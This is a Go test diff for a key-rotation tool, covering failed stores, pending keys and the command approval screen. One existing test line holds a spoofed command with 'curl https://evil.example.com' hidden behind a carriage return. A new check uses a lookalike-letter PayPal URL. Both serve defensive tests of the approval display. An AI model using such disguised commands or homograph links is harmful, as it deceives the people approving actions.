@@ -156,6 +156,13 @@ func (f *fakeProvider) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 			reply(401, nil)
 			return
 		}
+		if r.URL.Path == "/store-400" { // saved, then answered with an error: the destination now holds the key
+			var body struct{ Value string }
+			_ = json.NewDecoder(r.Body).Decode(&body)
+			f.stored = append(f.stored, body.Value)
+			reply(400, nil)
+			return
+		}
 		var body struct{ Value string }
 		_ = json.NewDecoder(r.Body).Decode(&body)
 		f.stored = append(f.stored, body.Value)
@@ -371,6 +378,55 @@ func TestRotate(t *testing.T) {
 					t.Fatal("a refused store must revoke the new key and leave state as it was:", store["label"], out, e)
 				}
 			}
+		}
+	})
+
+	t.Run("a store that answers 400 may have saved the key, so it stays live", func(t *testing.T) {
+		dir := t.TempDir()
+		p := filepath.Join(dir, "four.json")
+		writeJSON(t, p, maps(recipe, "name", "fake_400", "store", []any{map[string]any{"label": "400", "method": "PUT", "url": base + "/store-400", "body": map[string]any{"value": "{{new}}"}}}))
+		before := len(f.revoked)
+		code, out, _ := cli(t, "SECRET", "create", p)
+		if code != 1 || !strings.Contains(str(out["error"]), "may hold the new key") || len(f.revoked) != before {
+			t.Fatal("a 400 must not revoke a key the destination may hold:", out)
+		}
+	})
+
+	t.Run("a pending key stops scheduled runs until a person reruns rotate", func(t *testing.T) {
+		dir := t.TempDir()
+		p := filepath.Join(dir, "pend.json")
+		writeJSON(t, p, maps(recipe, "name", "fake_pend"))
+		cli(t, "SECRET", "rotate", p)
+		writeJSON(t, p, maps(recipe, "name", "fake_pend", "store", []any{map[string]any{"label": "flaky", "cmd": helper("fail", "")}}))
+		cli(t, "SECRET", "rotate", p)
+		pending := readState(t, dir)["pend.json"].Pending
+		made := f.n
+		for range 2 { // like a weekly job that keeps failing
+			if code, _, _ := cli(t, "SECRET", "rotate-all", dir); code != 1 || f.n != made {
+				t.Fatal("rotate-all must make no new key while one is pending")
+			}
+		}
+		log, _ := os.ReadFile(filepath.Join(dir, "keymolt.log"))
+		if pending == "" || !strings.Contains(string(log), "fix the store, then run") {
+			t.Fatal("the log must say what to do:", pending, string(log))
+		}
+		writeJSON(t, p, maps(recipe, "name", "fake_pend"))
+		code, out, _ := cli(t, "SECRET", "rotate", p)
+		if code != 0 || !slices.Contains(list(out["revoked"]), pending) || readState(t, dir)["pend.json"].Pending != "" {
+			t.Fatal("a rotate after the fix must revoke the pending key and clear it:", out)
+		}
+	})
+
+	t.Run("revoking the pending key clears it", func(t *testing.T) {
+		dir := t.TempDir()
+		p := filepath.Join(dir, "pendrev.json")
+		writeJSON(t, p, maps(recipe, "name", "fake_pendrev"))
+		cli(t, "SECRET", "rotate", p)
+		writeJSON(t, p, maps(recipe, "name", "fake_pendrev", "store", []any{map[string]any{"label": "flaky", "cmd": helper("fail", "")}}))
+		cli(t, "SECRET", "rotate", p)
+		pending := readState(t, dir)["pendrev.json"].Pending
+		if code, out, _ := cli(t, "SECRET", "revoke", p, pending); code != 0 || readState(t, dir)["pendrev.json"].Pending != "" {
+			t.Fatal("revoke must clear the pending key:", out)
 		}
 	})
 
@@ -725,6 +781,9 @@ func TestApproval(t *testing.T) {
 	_ = approveCommand(spoof, &out)
 	if strings.Contains(out.String(), "\r") || !strings.Contains(out.String(), `curl https://evil.example.com \r  store #0`) {
 		t.Fatal("the approval screen must show control characters, not obey them:", out.String())
+	}
+	if got := visible("https://p\u0430ypal.com"); got != `https://p\u0430ypal.com` {
+		t.Fatal("a lookalike letter must show as an escape:", got)
 	}
 	if err := os.WriteFile(path, []byte(" "), 0o600); err != nil { // editing the file revokes approval
 		t.Fatal(err)
